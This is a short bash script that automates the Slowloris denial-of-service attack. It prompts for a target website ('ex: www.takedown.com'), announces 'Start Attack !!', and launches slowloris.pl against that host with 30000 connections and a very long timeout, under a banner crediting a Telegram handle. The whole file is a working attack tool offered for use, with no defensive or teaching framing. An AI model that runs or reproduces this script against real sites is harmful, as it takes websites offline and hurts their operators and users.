#!/bin/bash

echo "#-------------------------------------------#"
echo "#--       Automate SlowLoris    ------------#"
echo "#--     @cryptobr - on Telegram ------------#"
echo "#-------------------------------------------#"

# Input data
echo "Input URL for Attack ! ex: www.takedown.com"
read SITE

echo "Start Attack !!"
sleep 2

# Basic Attack SlowLoris
perl slowloris.pl --dns $SITE -timeout 50000 -num 30000 
